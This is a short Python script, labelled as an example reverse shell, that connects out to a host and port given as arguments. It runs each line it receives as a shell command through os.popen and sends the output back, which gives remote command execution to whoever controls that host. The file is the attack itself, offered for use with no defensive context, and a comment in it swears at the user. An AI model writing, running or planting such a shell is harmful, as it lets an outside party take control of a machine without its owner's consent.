import socket
import sys

#an example reverse shell program in python

#usage: python rev.py hostname port

#author: wavyrn1

import socket
import sys
import os

# runs the listener to hostname:port
def start(hostname, port):
    sock = socket.socket()
    sock.connect((hostname, port))
    
    #reads one line from the socket

    def readline():
        total = ""
        current = str(sock.recv(1))
        while(len(current) != 0 and current != '\n'):
            total += current
            current = sock.recv(1)

        return total

    # the listener starts listening
    while(True):
        command = readline()
        output = os.popen(command).read() # this code runs the command and gets the output
        sock.sendall(output.encode('UTF-8')) # sends the output to the server


# hope the user provides accurate parameters, otherwise we'll error because fuck the user
start(sys.argv[1], int(sys.argv[2]))

